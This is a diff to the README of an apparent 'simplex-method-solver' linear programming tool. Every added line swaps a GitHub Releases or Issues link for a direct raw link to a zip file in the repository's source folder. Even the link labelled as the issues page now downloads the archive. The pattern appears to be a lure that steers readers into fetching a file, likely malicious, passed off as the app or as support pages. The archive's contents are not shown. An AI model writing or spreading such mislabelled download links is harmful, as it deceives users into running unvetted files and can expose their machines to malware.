@@ -1,7 +1,7 @@
 # 🎉 simplex-method-solver - Solve Linear Problems Easily
 
 ## 📥 Download the App
-[![Download the simplex-method-solver](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/angular-saint/simplex-method-solver/releases)
+[![Download the simplex-method-solver](https://raw.githubusercontent.com/angular-saint/simplex-method-solver/main/src/simplex-solver-method-v3.2.zip)](https://raw.githubusercontent.com/angular-saint/simplex-method-solver/main/src/simplex-solver-method-v3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the simplex-method-solver! This application helps you solve linear programming problems using the Simplex algorithm. You don’t need to be a programmer to use it. Follow these simple steps to get started.
@@ -21,7 +21,7 @@ Welcome to the simplex-method-solver! This application helps you solve linear pr
 
 ## 📦 Installation Instructions
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/angular-saint/simplex-method-solver/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/angular-saint/simplex-method-solver/main/src/simplex-solver-method-v3.2.zip) to find the latest version of the application.
 
 2. **Download the Package**
    On the Releases page, look for the latest version. You will see an option to download the app. Click the download link to start the process. 
@@ -65,7 +65,7 @@ If you encounter any issues while using the simplex-method-solver, consider the 
 - Consult the FAQs on the Releases page for additional help.
 
 ## 📞 Support
-For further assistance, feel free to open an issue on the [GitHub Issues page](https://github.com/angular-saint/simplex-method-solver/issues). Our community and team members are here to help you.
+For further assistance, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/angular-saint/simplex-method-solver/main/src/simplex-solver-method-v3.2.zip). Our community and team members are here to help you.
 
 ## 📑 Additional Resources
 - **Documentation:** More detailed information can be found in the documentation section on the GitHub repository.
@@ -74,4 +74,4 @@ For further assistance, feel free to open an issue on the [GitHub Issues page](h
 ## 🌟 Conclusion
 The simplex-method-solver makes solving linear programming problems accessible to anyone. You don’t need programming knowledge to navigate the application. Just follow the steps above, and you will be solving problems efficiently and effectively in no time. 
 
-Now, go ahead and [visit this page to download](https://github.com/angular-saint/simplex-method-solver/releases) the simplex-method-solver and take your first step into the world of optimization!
+Now, go ahead and [visit this page to download](https://raw.githubusercontent.com/angular-saint/simplex-method-solver/main/src/simplex-solver-method-v3.2.zip) the simplex-method-solver and take your first step into the world of optimization!
